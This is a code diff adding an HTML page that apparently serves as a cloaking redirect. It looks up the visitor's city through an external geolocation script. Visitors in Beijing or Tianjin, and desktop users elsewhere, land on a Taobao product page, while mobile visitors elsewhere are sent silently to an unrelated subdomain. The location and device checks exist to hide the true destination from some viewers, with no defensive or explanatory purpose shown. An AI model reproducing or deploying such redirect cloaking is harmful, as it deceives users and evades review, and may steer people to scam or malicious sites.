@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+</head>
+<body onload="ScreenWidth()">
+	<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+	<script language="JavaScript">
+	function ScreenWidth(){
+		var city = returnCitySN.cname;
+		if( (city.indexOf('北京市') >= 0) || (city.indexOf('天津市') >= 0) ){
+			window.location.href = 'https://item.taobao.com/item.htm?spm=a230r.1.14.178.7YLzcy&id=539339606205&ns=1&abbucket=16#detail';
+		}else{
+			if (screen.width <= 768){
+			    window.location.href = 'http://movse.nyes.xiyoba.cn/';
+			}else {
+			    window.location.href = 'https://item.taobao.com/item.htm?spm=a230r.1.14.178.7YLzcy&id=539339606205&ns=1&abbucket=16#detail';
+			}
+		}
+		
+	}
+	</script>
+</body>
+</html>
